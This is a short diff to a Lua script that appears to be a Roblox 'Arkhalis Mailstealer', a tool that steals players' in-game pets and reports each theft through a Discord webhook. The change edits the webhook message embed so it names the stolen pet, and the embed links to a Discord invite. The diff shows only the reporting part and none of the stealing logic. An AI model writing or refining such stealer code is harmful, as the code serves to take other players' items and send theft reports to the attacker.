@@ -48,6 +48,7 @@ local msg = {
 	["embeds"]= {
 	  {
 		["title"]= "`Arkhalis Mailstealer Results`",
+    ["description"]= "**Pet Sended**",
 		["url"]= "https://discord.gg/vzY4yAk9ns",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
@@ -57,8 +58,8 @@ local msg = {
         },
 		["fields"]= {
         {
-          ["name"]= "**🐕Pet Sended🐕**",
-          ["value"]= "```".._G.PetName.."```",
+          ["name"]= "**🐕Pet🐕**",
+          ["value"]= "```"..v.Name.."```",
           ["inline"]= true
         },
 
